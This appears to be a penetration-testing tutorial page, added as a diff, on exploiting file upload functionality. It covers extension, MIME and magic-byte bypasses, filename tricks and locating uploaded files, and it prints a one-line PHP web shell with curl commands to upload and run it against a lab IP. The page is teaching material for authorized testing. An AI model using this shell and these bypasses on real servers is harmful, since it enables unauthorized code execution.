@@ -1,0 +1,169 @@
+---
+title: File Upload Vulnerabilities
+description: Testing file upload functionality — extension, MIME, and content validation, filename manipulation, web-accessible locations, double extensions, and the path to a web shell.
+section: web
+phase: 3
+order: 8
+difficulty: intermediate
+draft: false
+tags: ['file-upload', 'web-shell', 'bypass', 'mime', 'extension']
+updated: 2026-08-08
+---
+
+import Alert from '../../../components/ui/Alert.astro';
+import Badge from '../../../components/ui/Badge.astro';
+import CodeBlock from '../../../components/ui/CodeBlock.astro';
+import SourceTag from '../../../components/ui/SourceTag.astro';
+
+## The upload attack surface
+
+Anywhere a user can upload a file — avatars, attachments, documents, profile images — is an attack surface. The attack's value comes from one question: **is the uploaded content ever executed by the server?**
+
+If a file you control lands in a location the web server will execute (`.php` in a PHP site, `.jsp` in a Java app), you have code execution. That makes uploads one of the most direct routes to [initial access](/guides/web/web-shells-initial-access) in the whole phase.
+
+## What the server validates (and how to test it)
+
+### Extension validation
+
+Many apps whitelist or blacklist extensions. Test both directions:
+
+<CodeBlock
+  lang="text"
+  title="Extension tests"
+  code={`shell.php          -> blocked (extension blacklist)
+shell.php5          -> blocked?
+shell.phtml         -> blocked?
+shell.php.png       -> double extension: does the server run .php?
+shell.jpg           -> whitelist bypass if content sniffing is weak
+shell.php%00.png    -> legacy null-byte truncation
+shell.php..png / shell.php.JPG -> case tricks on some configs
+`}
+/>
+
+- **Purpose:** map exactly which extensions the filter accepts.
+- **Expected result:** the accepted ones reveal whether execution is reachable.
+- **Investigate next:** request the accepted file; if it renders as a program or an upload of a `.php`-looking file executes, you are close.
+
+### MIME validation
+
+The server may trust the `Content-Type` the client claims:
+
+<CodeBlock
+  lang="bash"
+  title="Forge the MIME type (authorized lab)"
+  code={`curl -F "file=@shell.php;type=image/png" http://10.10.10.42/upload
+`}
+/>
+
+- **Purpose:** bypass a check that only reads the MIME header.
+- **Expected result:** a `.php` file accepted because it claimed to be a PNG.
+- **Investigate next:** check whether the file keeps its `.php` name on disk.
+
+### Content validation
+
+Some apps inspect the file's magic bytes:
+
+- **Weak check** — only the first bytes are PNG magic. Prepending `\x89PNG` junk to PHP makes it pass a signature sniff while PHP still executes the `<?php ... ?>` part.
+- **Strong check** — full image re-encoding: real exploitation then shifts to polyglot files (valid image that also contains PHP).
+
+<SourceTag source="practical" /> The question is always the same: **is the check on the name, the header, or the content — and does the server execute the file regardless?**
+
+## Filename manipulation
+
+How the server stores your file can defeat or enable you:
+
+- **Original name kept** — `shell.php` stays `shell.php` → good for you.
+- **Renamed/randomized** — `a78f2b.php` → still executable, but you must find the path.
+- **Sanitized** — dots/slashes stripped → a simple `shell.php` may become `shellphp`; try `shell.php.jpg` so the stripped part leaves `.php`.
+- **Extension preserved but path hidden** — hunt for the upload location (below).
+
+## Web-accessible upload locations
+
+An uploaded file is only useful if you can request it. Find where uploads go:
+
+<CodeBlock
+  lang="text"
+  title="Places uploads land"
+  code={`/uploads/shell.php
+/images/shell.php
+/media/avatar/shell.php
+/static/files/shell.php
+`}
+/>
+
+- The upload response often reveals the path (`"url": "/uploads/2026/08/shell.php"`).
+- Mirror the directory enumeration from [Web Enumeration](/guides/web/web-enumeration) on the upload directory.
+- If the path is guessable and the file has a predictable name, you can find it.
+
+<CodeBlock
+  lang="bash"
+  title="Confirm execution"
+  code={`curl -s http://10.10.10.42/uploads/shell.php?c=id
+# 200 with command output  -> code execution confirmed
+`}
+/>
+
+## Double extensions and filtering weaknesses
+
+Commonly exploitable weaknesses, summarized:
+
+| Filter type | Typical bypass |
+|---|---|
+| Extension blacklist | Use `.php5`, `.phtml`, `.phar` |
+| Extension whitelist | Double extension `file.php.jpg` on misconfigured Apache/PHP |
+| MIME check only | Forge `Content-Type` |
+| Signature check only | Prepend PNG magic bytes to PHP |
+| Null-byte (legacy) | `shell.php%00.png` |
+| Case sensitivity | `shell.PHP`, `shell.PHp` |
+| Trailing dot/space | `shell.php.` or `shell.php ` on Windows |
+
+<Alert variant="warning" title="Test one variable at a time">
+  Uploads are fiddly. Change a single thing (name, extension, MIME, content) per request and observe what the server accepts, so you know exactly which check you bypassed.
+</Alert>
+
+## The web shell concept
+
+A web shell is a script you upload that executes commands when requested:
+
+<CodeBlock
+  lang="php"
+  title="Minimal PHP web shell (lab only)"
+  code={`<?php echo shell_exec($_GET['c']); ?>
+`}
+/>
+
+<CodeBlock
+  lang="bash"
+  title="Use it"
+  code={`curl "http://10.10.10.42/uploads/shell.php?c=id"
+`}
+/>
+
+- **Purpose:** confirm code execution through the upload.
+- **Expected result:** the output of `id` in the response.
+- **Investigate next:** upgrade to an interactive [shell](/guides/web/web-shells-initial-access) — a web shell is a starting point, not a destination.
+
+## Testing methodology summary
+
+1. **Map the upload** — find every upload point; record accepted file types.
+2. **Establish a baseline** — upload a legit PNG; find its URL and confirm it renders.
+3. **Probe validation** — one variable at a time: extension, MIME, content, filename.
+4. **Locate the file** — the upload URL, response body, or directory brute-force.
+5. **Confirm execution** — request the file; look for program output rather than binary.
+6. **Escalate** — turn execution into an interactive shell (see [Web Shells & Initial Access](/guides/web/web-shells-initial-access)).
+
+## Common mistakes
+
+- **Stopping at "upload accepted"** — acceptance is only half; the file must also be reachable and executable.
+- **Not finding where the file landed** and never confirming execution.
+- **Skipping double-extension and case tricks** when the obvious `.php` is blocked.
+- **Only testing the first upload field** — every upload point is a separate test.
+- **Uploading destructive payloads** in labs where the app re-reads files.
+- **Using a shell with no way to control output** — test `?c=id` before relying on it.
+
+## Related guides
+
+- [Web Shells & Initial Access](/guides/web/web-shells-initial-access) — what upload leads to.
+- [Local & Remote File Inclusion](/guides/web/local-remote-file-inclusion) — LFI + upload is the classic reliable RCE.
+- [Command Injection](/guides/web/command-injection) — the same "execute on the server" goal via a different sink.
+- [Web Exploitation Methodology](/guides/web/web-exploitation-methodology) — uploads in the decision flow.
